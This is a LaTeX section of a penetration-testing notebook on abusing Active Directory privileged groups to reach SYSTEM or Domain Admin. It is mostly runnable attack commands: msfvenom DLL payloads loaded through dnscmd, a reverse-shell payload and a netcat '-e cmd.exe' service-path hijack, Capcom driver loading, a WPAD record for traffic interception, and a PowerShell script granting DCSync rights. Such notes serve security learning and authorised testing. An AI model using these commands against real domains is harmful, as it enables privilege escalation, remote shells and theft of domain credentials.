\section{Privileged Groups}
\label{ad:pe:groups}


Valid account anble to abuse some windows privileges. To get a better list of
all the privilges that can be abused check this:
\begin{itemize}
    \item \href{https://adsecurity.org/?p=3658}{Scanning for Active Directory Privileges \& Privileged Accounts}
    \item 
        \href{https://github.com/gtworek/Priv2Admin/blob/master/README.md}{link}
\end{itemize}


\subsection{Hyper-V Administrators}
The \href{https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators}{Hyper-V Administrators} group has full access to all \href{https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines}{Hyper-V features}. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.

It is also well documented on this \href{https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/}{blog}, that upon deleting a virtual machine, \verb+vmms.exe+ attempts to restore the original file permissions on the corresponding \verb+.vhdx+ file and does so as \verb+NT AUTHORITY\SYSTEM+, without impersonating the user. It is possible to delete the \verb+.vhdx+ file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.

If the operating system is vulnerable to \href{https://www.tenable.com/cve/CVE-2018-0952}{CVE-2018-0952} or \href{https://www.tenable.com/cve/CVE-2019-0841}{CVE-2019-0841}, it is possible to leverage this to gain SYSTEM privileges. Otherwise, it is possible to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

An example of this is Firefox, which installs the Mozilla Maintenance Service. It is possible to  update this exploit (a proof-of-concept for NT hard link) to grant the user full permissions on the file \verb+C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe+

\begin{verbatim}
## allow to take ownership of the programm
import-module hyperv-eop.ps1

##  Taking Ownership of the File
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

## replace maintenanceservice.exe by a malicious app

## Start the Mozilla Maintenance Service
sc.exe start MozillaMaintenance
\end{verbatim}

{\bf Note}: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.


\subsection{DnsAdmin}
 The DNS service runs as \verb+NT AUTHORITY\SYSTEM+, so membership in this
 group could potentially be leveraged to escalate privileges on a Domain
 Controller or in a situation where a separate server is acting as the DNS
 server for the domain.

\subsubsection{DLL injection}
 Check this post \href{https://adsecurity.org/?p=4064}{post}.
he following attack can be performed when DNS is run on a Domain Controller (which is very common):
\begin{itemize}
    \item  DNS management is performed over RPC
    \item
        \href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723}{ServerLevelPluginDll} allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
    \item  When a member of the DnsAdmins group runs the dnscmd command below,
        the
        \verb+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll+ registry key is populated
    \item  When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
    \item  An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
\end{itemize}

Only the dnscmd utility can be used by members of the DnsAdmins group, as they
do not directly have permission on the registry key.


\begin{verbatim}
msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> 
    /add /domain' -f dll -o adduser.dll

## Loading DLL as Member of DnsAdmins
dnscmd.exe [<dns_server_fqdn>] /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
dnscmd.exe [<dns_server_fqdn>] /config /serverlevelplugindll \\IP\share\adduser.dll

## restart DNS
dnscmd  [<dns_server_fqdn>] /restart


## Confirming Registry Key Added
reg query \\IP\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

## Checking Permissions on DNS Service
sc.exe sdshow DNS


## Stopping the DNS Service
 sc stop dns
# might be necessary to to add hostname
sc \\resolute stop dns

## Starting the DNS Service
sc start dns

## Confirming Group Membership
net group "Domain Admins" /dom

## Deleting Registry Key
 reg delete \\IP\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
\end{verbatim}

other payloads
\begin{verbatim}
windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain'
windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 
\end{verbatim}


As detailed in this
\href{http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html}{post}, 
it is also possible to use
\href{https://github.com/gentilkiwi/mimikatz/tree/master/mimilib}{mimilib.dll}
to gain command execution by modifying the \verb+kdns.c+ file to
execute a reverse shell one-liner or another command of our choosing.

\subsubsection{Creating a WPAD Record}
Another way to abuse DnsAdmins group privileges is by creating a WPAD record.
Membership in this group gives us the rights to
\href{https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps}{disable
global query block security}, which by default blocks this attack. Server 2008
first introduced the ability to add to a global query block list on a DNS
server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and
Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global
query block list. These protocols are quite vulnerable to hijacking, and any
domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every
machine running WPAD with default settings will have its traffic proxied
through the attack machine. Tool such as Responder~\ref{tool:responder} or
Inveigh~\ref{tool:inveigh} to perform traffic spoofing, and attempt to capture
password hashes and crack them offline or perform an SMBRelay attack.

\begin{verbatim}
## Disabling the Global Query Block List
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
## Adding a WPAD Record
Add-DnsServerResourceRecordA -Name wpad -ZoneName NAME -ComputerName DNS_FQDN
    -IPv4Address IP
\end{verbatim}

\subsection{Event Log Readers}
Windows events  can be queried from the command line using the
\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil}{wevtutil}
utility and the
\href{https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1}{Get-WinEvent} PowerShell cmdlet.

\begin{verbatim}
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 |
    findstr "/user"
# use -Credential to run as 
Get-WinEvent -LogName security |
    where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} |
    Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
\end{verbatim}

\subsection{Print Operators (SeLoadDriverPrivilege)}

{\bf Note}: Since Windows 10 Version 1803, the {\emph SeLoadDriverPrivilege} is not exploitable, as it is no longer possible to include references to registry keys under "\verb+HKEY_CURRENT_USER+".

\subsubsection{Capcom Driver}


It's well known that the driver Capcom.sys contains functionality to allow any user to execute shellcode with SYSTEM privileges. {\emph SeLoadDriverPrivilege} allow to load this vulnerable driver and escalate privileges.

{\bf GUI exploit}

\begin{enumerate}
	\item download \href{https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp}{EnableSeLoadDriverPrivilege.cpp} to enable privilege as well as load the driver.

	\item edit the headers to include \verb+<stdio.h>+ and \verb+"tchar.h"+

	\item compile the file from Visual Studio (\verb+cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp+)
	
	\item Download \verb+Capcom.sys+ driver \href{https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys}{here}.
	
	\item  add a reference to this driver under \verb+HKEY_CURRENT_USER+ tree
\begin{verbatim}
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\PATH_TO\Capcom.sys"
\end{verbatim}

	\item enable SeLoadDriverPrivilege and load the driver


	\item verify that the Capcom driver is listed using Nirsoft's \href{http://www.nirsoft.net/utils/driverview.html}{DriverView.exe}
	
	\item use \href{https://github.com/tandasat/ExploitCapcom}{ExploitCapcom} tool to escalate privileges.
\begin{verbatim}
DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom	
\end{verbatim}

\end{enumerate}

this can be automated using \href{https://github.com/tandasat/ExploitCapcom}{ ExploitCapcom tool after compiling with it Visual Studio}



{\bf No GUI exploit}

Without GUI access to the target, it is necessary  to modify the \verb+ExploitCapcom.cpp+ code to call for example a reverse shell crafted with msfvenom.

\begin{verbatim}
<<<<<
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
>>>>>
TCHAR CommandLine[] = TEXT("PATH_TO_EXEC_TO_CALL");
\end{verbatim}

{\bf Automating with EopLoadDriver}

\href{https://github.com/TarlogicSecurity/EoPLoadDriver/}{EoPLoadDriver} allow to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver.

\begin{verbatim}
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\PATH_TO\Capcom.sys
\end{verbatim}



{\bf Clean-up}

\begin{verbatim}
reg delete HKCU\System\CurrentControlSet\Capcom
\end{verbatim}


\subsection{Server Operators}

Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.

It is then possible to abuse the path of a service (for example \verb+AppReadiness+) that run under SYSTEM in order to elevate privileges.

\begin{verbatim}
# Check service privilege and rights
sc qc AppReadiness
PsService.exe security AppReadiness


sc config AppReadiness binPath= "cmd /c net localgroup Administrators User /add"
sc start AppReadiness
sc config AppReadiness binPath= "PATH\nc64.exe -e cmd.exe IP PORT"
\end{verbatim}

list of common services in case enumeration does not work:
\begin{itemize}
    \item \verb+AppReadiness+
    \item \verb+vss+
\end{itemize}


If this is performed on a DC then  \ldots

\subsection{Account Operators}

\href{https://www.whiteoaksecurity.com/blog/account-operators-privilege-escalation/}{Account Operators Privilege Escalation}

\subsubsection{Add to high-value default droups}

\begin{itemize}
    \item DNSAdmins
    \item Exchange Windows Permissions
    \item Azure Admins
\end{itemize}

\subsubsection{Add to high-value non-default droups}

guess



\subsection{Exchange Windows Permissions}
A default installation of Microsoft Exchange within an AD environment (with no
split-administration model) opens up many attack vectors, as Exchange is often
granted considerable privileges within the domain (via users, groups, and
ACLs). The group \emph{Exchange Windows Permissions} is not listed as a
protected group, but members are granted the ability to write a DACL to the
domain object. This can be leveraged to give a user \verb+DCSyn+ privileges. An
attacker can add accounts to this group by leveraging a DACL misconfiguration
(possible) or by leveraging a compromised account that is a member of the
Account Operators group. It is common to find user accounts and even computers
as members of this group. Power users and support staff in remote offices are
often added to this group, allowing them to reset passwords. This
\href{https://github.com/gdedrouas/Exchange-AD-Privesc}{GitHub repo} details a
few techniques for leveraging Exchange for escalating privileges in an AD
environment.

The Exchange group \emph{Organization Management} is another extremely powerful
group (the "Domain Admins" of Exchange) and can access the mailboxes of all
domain users. It is not uncommon for sysadmins to be members of this group.
This group also has full control of the OU called \emph{Microsoft Exchange
Security Groups}, which contains the group \emph{Exchange Windows Permissions}.

Compromise an Exchange server, will often lead to Domain Admin privileges.
Additionally, dumping credentials in memory from an Exchange server will
produce 10s if not 100s of cleartext credentials or NTLM hashes. This is often
due to users logging in to Outlook Web Access (OWA) and Exchange caching their
credentials in memory after a successful login.


\subsubsection{Grant DCSync}

Grant yourself \verb+Ds-Replication-Get-Changes+ and \verb+Ds-Replication-Get-Changes-All+ extended rights:

\begin{verbatim}
$acl = get-acl "ad:DC=test,DC=local"
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$user = Get-ADUser -Identity $id.User
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
# rightsGuid for the extended right Ds-Replication-Get-Changes-All
$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
# rightsGuid for the extended right Ds-Replication-Get-Changes
$objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-acl -aclobject $acl "ad:DC=test,DC=local"
\end{verbatim}

\subsubsection{PrivExchange}

The \emph{PrivExchange} attack results from a flaw in the Exchange Server
\emph{PushSubscription} feature, which allows any domain user with a mailbox to
force the Exchange server to authenticate to any host provided by the client
over HTTP.

The Exchange service runs as SYSTEM and is over-privileged by default (i.e.,
has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw
can be leveraged to relay to LDAP and dump the domain NTDS database. If relay
cannot be done to LDAP, this can be leveraged to relay and authenticate to
other hosts within the domain. This attack will take you directly to Domain
Admin with any authenticated domain user account.

\subsubsection{Links}
\begin{itemize}
    \item \href{https://github.com/gdedrouas/Exchange-AD-Privesc}{Exchange-AD-Privesc}
\end{itemize}

\subsection{links}
\begin{itemize}
	\item 
	\url{https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges}
\end{itemize}